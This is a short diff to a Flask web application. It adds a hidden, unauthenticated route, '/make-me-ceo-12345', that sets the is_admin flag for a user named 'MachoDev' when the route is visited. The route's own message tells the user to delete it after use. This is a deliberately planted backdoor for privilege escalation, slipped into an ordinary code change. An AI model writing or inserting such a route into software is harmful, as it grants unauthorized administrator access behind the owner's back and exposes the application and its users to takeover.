@@ -413,6 +413,14 @@ def view_story(story_id):
     story = c.fetchone()
     conn.close()
     return render_template('view_story.html', story=story)
-
+    
+@app.route('/make-me-ceo-12345')
+def make_me_ceo():
+    user = User.query.filter_by(username='MachoDev').first()
+    if user:
+        user.is_admin = True
+        db.session.commit()
+        return "CEO Status: ACTIVATED. Delete this route now!"
+    return "User not found"
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
